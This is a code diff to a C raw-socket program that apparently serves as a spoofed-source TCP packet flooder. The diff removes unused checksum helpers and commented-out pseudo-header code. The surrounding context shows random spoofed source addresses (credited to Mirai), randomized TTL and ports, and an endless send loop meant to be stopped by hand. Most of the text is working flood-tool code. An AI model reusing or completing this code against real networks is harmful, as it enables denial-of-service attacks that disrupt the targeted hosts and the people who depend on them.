@@ -31,7 +31,6 @@ License: MIT
 #define RAND_TTL 1 // Toggle TTL randomization
 #define RAND_TTL_MIN 55
 #define RAND_TTL_MAX 63
-#define FAST_CSUM 0 // Toggle fast checksum updating (experimental)
 
 #define PROTO_TCP_OPT_NOP   1
 #define PROTO_TCP_OPT_MSS   2
@@ -137,26 +136,6 @@ uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int l
     return ((uint16_t) (~sum));
 }
 
-static void update_ip_csum(struct iphdr* iph, __be32 old_saddr) {
-  if (old_saddr == iph->saddr){
-    return;
-  }
-  __sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
-  sum += ntohs(iph->check);
-  sum = (sum & 0xffff) + (sum>>16);
-  iph->check = htons(sum + (sum>>16) + 1);
-}
-
-static void update_tcp_csum(struct iphdr* iph, struct tcphdr* tcph, __be32 old_saddr) {
-  if (old_saddr == iph->saddr){
-    return;
-  }
-  __sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
-  sum += ntohs(tcph->check);
-  sum = (sum & 0xffff) + (sum>>16);
-  tcph->check = htons(sum + (sum>>16) + 1);
-}
-
 static uint32_t random_ipv4(void) {
   // Adapted from Mirai (https://github.com/jgamblin/Mirai-Source-Code)
   uint32_t addr;
@@ -203,29 +182,6 @@ static uint32_t random_ipv4(void) {
 static uint16_t random_port(void) {
 	uint16_t port = (uint16_t)(rand()) & 0xff;
 	return port;
-}
-
-unsigned short csum(unsigned short *ptr,int nbytes) {
-	register long sum;
-	unsigned short oddbyte;
-	register short answer;
-
-	sum=0;
-	while(nbytes>1) {
-		sum+=*ptr++;
-		nbytes-=2;
-	}
-	if(nbytes==1) {
-		oddbyte=0;
-		*((u_char*)&oddbyte)=*(u_char*)ptr;
-		sum+=oddbyte;
-	}
-
-	sum = (sum>>16)+(sum & 0xffff);
-	sum = sum + (sum>>16);
-	answer=(short)~sum;
-
-	return(answer);
 }
 
 int main(int argc, char *argv[]) {
@@ -339,9 +295,6 @@ int main(int argc, char *argv[]) {
 	iph->saddr = inet_addr(default_src_addr);
 	iph->daddr = sin.sin_addr.s_addr;
 
-	// // IP checksum
-	// iph->check = csum ((unsigned short *) datagram, iph->tot_len);
-
 	// TCP Header
 	tcph->source = htons(default_src_port);
 	tcph->dest = sin.sin_port;
@@ -384,23 +337,6 @@ int main(int argc, char *argv[]) {
 	*opts++ = 3;
 	*opts++ = 6; // 2^6 = 64, window size scale = 64
 
-	// // TCP checksum
-	// psh.source_address = inet_addr(default_src_addr);
-	// psh.dest_address = sin.sin_addr.s_addr;
-	// psh.placeholder = 0;
-	// psh.protocol = IPPROTO_TCP;
-	// psh.tcp_length = htons(sizeof(struct tcphdr) + TCP_OPT_LEN;// + strlen(data));
-
-	// int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + TCP_OPT_LEN;// + strlen(data);
-	// pseudogram = malloc(psize);
-
-	// memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
-	// memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + TCP_OPT_LEN;// + strlen(data));
-
-	// tcph->check = csum((unsigned short*) pseudogram, psize);
-
-	// __be32 old_saddr;
-	// __be32 new_saddr;
 	// Generate packets forever, the caller must terminate this program manually
 	while(1) {
 		struct iphdr *iph = (struct iphdr *)datagram;
@@ -437,11 +373,6 @@ int main(int argc, char *argv[]) {
 		iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 		tcph->check = 0;
 		tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + TCP_OPT_LEN), sizeof (struct tcphdr) + TCP_OPT_LEN);
-		
-		// psh.source_address = new_saddr;
-		// memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
-		// memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + TCP_OPT_LEN + strlen(data));
-		// tcph->check = csum( (unsigned short*) pseudogram , psize);
 
 		// Send the packet
 		if (sendto (s, datagram, sizeof (struct iphdr) + sizeof (struct tcphdr) + TCP_OPT_LEN,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
